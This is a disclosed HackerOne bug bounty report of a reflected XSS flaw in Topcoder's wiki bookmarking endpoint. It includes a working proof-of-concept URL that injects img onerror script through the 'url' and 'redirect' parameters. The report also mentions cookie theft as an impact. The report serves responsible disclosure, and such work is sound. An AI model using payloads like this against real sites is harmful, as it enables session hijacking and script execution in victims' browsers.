# Reflected XSS on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action

## Report Details
- **Report ID**: 866829
- **URL**: https://hackerone.com/reports/866829
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-05T22:26:20.231Z
- **Disclosed**: 2020-05-12T13:41:20.958Z

## Reporter
- **Username**: meryem0x
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: lab45

## Vulnerability Information
## Summary:
Hi :) A reflected XSS occurs when creating bookmarks.

## Steps To Reproduce:

A user can create bookmarks on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action. In this url  `redirect` and `url` parameters are vulnerable to XSS.

PoC:
`https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action?url=Asd"><img src=X onerror=alert(document.domain)>&redirect=Asd"><img src=X onerror=alert(document.cookie)>`

{F816796}
{F816795}

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

## Attachments
- 2020-05-06_01-20-55_ekran_g_r_nt_s_.png
- 2020-05-06_01-21-28_ekran_g_r_nt_s_.png
